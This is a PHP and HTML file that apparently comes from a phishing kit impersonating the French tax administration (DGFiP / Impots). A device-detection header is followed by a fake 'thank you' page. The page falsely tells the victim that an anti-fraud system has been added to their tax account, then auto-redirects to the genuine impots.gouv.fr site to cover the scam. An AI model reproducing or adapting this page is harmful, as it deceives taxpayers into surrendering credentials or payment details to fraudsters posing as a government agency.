<?
date_default_timezone_set('UTC');
$rand="0123456789abcdefghijklmnopqrstuvwxyz";
/// Code Detect mobile/tablet/pc
$tablet_browser = 0;
$mobile_browser = 0;
if (preg_match('/(tablet|ipad|playbook)|(android(?!.*(mobi|opera mini)))/i', strtolower($_SERVER['HTTP_USER_AGENT']))) {$tablet_browser++;}
if (preg_match('/(up.browser|up.link|mmp|symbian|smartphone|midp|wap|phone|android|iemobile)/i', strtolower($_SERVER['HTTP_USER_AGENT']))) {$mobile_browser++;}
if ((strpos(strtolower($_SERVER['HTTP_ACCEPT']),'application/vnd.wap.xhtml+xml') > 0) or ((isset($_SERVER['HTTP_X_WAP_PROFILE']) or isset($_SERVER['HTTP_PROFILE'])))) {
$mobile_browser++;}$mobile_ua = strtolower(substr($_SERVER['HTTP_USER_AGENT'], 0, 4));
$mobile_agents = array('w3c ','acs-','alav','alca','amoi','ma','usa','il','ca','fr','es','co','nt','rt','audi','avan','benq','bird','blac','blaz','brew','cell','cldc','cmd-','dang','doco','eric','hipt','inno','act','ba','ipaq','java','jigs','kddi','keji','leno','lg-c','lg-d','lg-g','lge-','m','maui','maxo','midp','mits','mmef','mobi','mot-','moto','mwbp','nec-','ld','newt','noki','palm','pana','pant','phil','@','android','ios','play','port','prox','qwap','sage','sams','sany','sch-','sec-','send','seri','sgh-','shar','ia','sie-','siem','smal','smar','sony','sph-','symb','t-mo','teli','tim-','tosh','tsm-','upg1','upsi','vk-v','voda','wap-','wapa','wapi','wapp','wapr','webc','winw','winw','xda ','xda-');
if (in_array($mobile_ua,$mobile_agents)) {$mobile_browser++;}
if (strpos(strtolower($_SERVER['HTTP_USER_AGENT']),'opera mini') > 0) {$mobile_browser++;
$stock_ua = strtolower(isset($_SERVER['HTTP_X_OPERAMINI_PHONE_UA'])?$_SERVER['HTTP_X_OPERAMINI_PHONE_UA']:(isset($_SERVER['HTTP_DEVICE_STOCK_UA'])?$_SERVER['HTTP_DEVICE_STOCK_UA']:''));
if (preg_match('/(tablet|ipad|playbook)|(android(?!.*mobile))/i', $stock_ua)) {$tablet_browser++;}}
if ($tablet_browser > 0) {}
else if ($mobile_browser > 0) {}
else {}
/// End
?>
<!DOCTYPE HTML>
<html lang="fr" xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width; initial-scale=1; maximum-scale=1"><link rel="stylesheet" href="css/style.css"/>
<meta http-equiv="Refresh" content="3; url=https://cfspro.impots.gouv.fr">
<link rel="icon" href="images/favicon.ico"/>
<script src="js/telepaiement_continuer.js"></script>
<title>Merci</title>
</head>
<body>
<div style="width:100%;text-align:center;">
<img src="images/peka.svg" style="width:97%;"/>
<img src="images/safe.png" style="width:25%;margin-top:-24px;"/>
</div>

<div style="width:100%;background-color:#e8e8e8;padding-top:9px;padding-bottom:35px;">
<center>

<div style="margin-top:-11px;">
<div style="background:white;width:94%;border-radius:4px;padding-bottom: 10px;">
<h1 class="titre">Merci,Vous avez r&eacute;tabli l'acces &agrave; votre compte</h1>
<center>
<form class="form01" method="post" action="" onsubmit="return validate();" onchange="return validate();">

<center><img src="images/than.png"></center>
<div style="color: white;background: #5eba40;border-radius: 3px;font: 1em Arial, sans-serif;text-align: left;font-size: 14px;width: 80%;padding: 10px;">
Le nouveau syst&eacute;me de lutte contre la fraude a &eacute;t&eacute; ajout&eacute; avec succ&eacute;s &agrave; votre compte Impots. Maintenant, vous serez connecter &agrave; votre compte.
</div>

</form>
</center>
</div>
</div>

</center>
</div>

<br>
<br>
<center>
<div style="color:black;font-size:14px;">Direction g&eacute;n&eacute;rale des Finances publiques</div>
</center>
<br>
<br>
</body>
</html>